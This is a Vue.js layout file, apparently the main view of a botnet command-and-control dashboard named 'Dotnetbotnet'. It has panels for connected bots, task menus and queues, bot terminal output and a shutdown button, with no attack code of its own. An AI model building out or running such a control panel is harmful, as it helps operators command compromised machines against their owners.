<script setup>
import Header from './components/general/Header.vue'
import BotsList from './components/botslistsection/BotsList.vue'
import SectionTitle from './components/botslistsection/SectionTitle.vue'
import Count from './components/actionssection/count/Count.vue'
import Params from './components/actionssection/params/Params.vue'
import Queue from './components/actionssection/queue/Queue.vue'
import TaskMenu from './components/actionssection/tasks/TaskMenu.vue'
import BotTermOutput from './components/botoutputsection/BotTermOutput.vue'
import BotTaskReturns from './components/botoutputsection/BotTaskReturns.vue'
import QueueStatus from "./components/waitingqueue/QueueStatus.vue"
import Details from "./components/botoutputsection/Details.vue"
</script>

<template>
  
  <!-- Main content section -->
  <div class="leftSideHolder">
    <!-- Header of the page -->
    <Header msg="Dotnetbotnet" style="margin-top: 1%; text-align: center;" />
    <SectionTitle class="listofbots" msg="List of Connected Bots"/>
    <div class="botlistsection">
      <BotsList></BotsList>
    </div>
  </div>

<!-- fix this -->
<div class="rightSideContainer">
  <div class="horizRightHolder">
    <div class="botOutputSection">
      <div class="botOutputFlex">
        <div class="leftInner">
          <Details />
          <BotTermOutput />
        </div>
        <div class="rightInner">
          <BotTaskReturns />
          <button class="btn btn-outline-danger stopButton">Shutdown</button>
        </div>
      </div>
    </div>

    <div class="waitingQueue">
      <div class="waitingQueueFlex">
        <div>
          <QueueStatus />
        </div>
      </div>
    </div>
</div>

  <!-- fix this -->
    <div class="actionsSection">
      <div class="actionsFlex">
        <div>
          <Count />
          <TaskMenu />
        </div>
        <Params />
        <Queue />
      </div>
  </div>
</div>

</template>

<style scoped>
.leftSideHolder {
  display: flex;
  flex-direction: column;
  width: 30%;
}
.listofbots {
  margin: 1% auto 0% auto;
  width: 100%;
}
.botlistsection {
  width: 65%;
  margin: 1% auto;
  background-color: rgba(0, 8, 42, 0.612);
  padding: 1%;
  max-height: 80%;
  min-height: 80%;
  border: 2px solid white;
  overflow-y: auto;
}
.details-terms {
  position: absolute;
  top: 0;
  display: flex;
  flex-direction: row;
  justify-content: right;
  align-items: flex-end;
  height: 60%;
}
.rightSideContainer {
  display: flex;
  flex-direction: column;
  width: 70%;
  margin: 2% 2%;
}
.horizRightHolder {
  display:flex; 
  width: 100%;
  flex-direction: row;
}
.actionsSection {
  height: 21vh;
  width: 100%;
  margin: 0%;
  padding: 0%;
}
.actionsFlex{
  display: flex;
  flex-direction: row;
  justify-content: left;
  width: 100%;
  height: 100%;
}

.botoutputsection {
  height: 21vh;
  width: 50%;
}
.botOutputFlex{
  display: flex;
  justify-content: center;
  width: 100%;
  border: 2px solid white;
  height:72vh;
  margin-top: 0%;
}
.waitingQueue {
  height: 21vh;
  width: 50%;
}
.waitingQueueFlex{
  display: flex;
  justify-content: center;
  width: 100%;
  border: 2px solid white;
  height: 72vh;
  margin-top: 0%;
}

.leftInner {
  width:50%;
  margin:0px;
}
.rightInnter {
  width:50%;
  margin:0px;
}

.stopButton {
  width: 50%;
  margin: auto;
}

</style>
